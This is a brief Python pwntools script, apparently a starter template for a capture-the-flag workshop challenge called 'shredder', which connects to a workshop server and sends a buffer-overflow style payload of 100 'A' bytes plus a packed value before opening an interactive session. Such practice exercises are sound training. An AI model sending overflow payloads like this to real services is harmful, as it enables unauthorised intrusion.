from pwn import *
import subprocess

CHAL = "shredder"

p = remote("ctfworkshop.cybr.club", 3003)

p.sendline(b"A" * 100 + p64(1))
# automate inputs as necessary here

p.interactive()
